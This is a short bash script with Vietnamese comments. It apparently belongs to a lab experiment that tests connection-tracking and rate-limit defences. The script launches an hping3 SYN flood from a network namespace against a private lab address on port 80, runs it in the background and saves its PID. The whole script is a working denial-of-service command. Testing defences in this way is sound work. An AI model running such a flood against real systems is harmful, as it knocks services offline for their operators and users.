#!/bin/bash
# ==============================================================================
# Script: run_attack.sh
# Mục đích: SYN Flood để ép bảng Conntrack và Rate Limit (Phase 2 & 3)
# Chạy trên: Attacker VM (Namespace ns_50)
# ==============================================================================

VICTIM_IP="10.10.2.2"

echo "[!] Bắt đầu tấn công SYN Flood tại ns_50..."

# Sử dụng khoảng cách u1000 = 1000 packet/giây thay vì --fast để đo chính xác PPS
# Chạy ngầm
ip netns exec ns_50 hping3 -S -p 80 -i u1000 $VICTIM_IP > /dev/null 2>&1 &
HPING_PID=$!

# Lưu PID ra file để lúc sau Kill dễ dàng
echo $HPING_PID > /tmp/hping3.pid
echo "Đã đưa hping3 vào background (PID: $HPING_PID)."
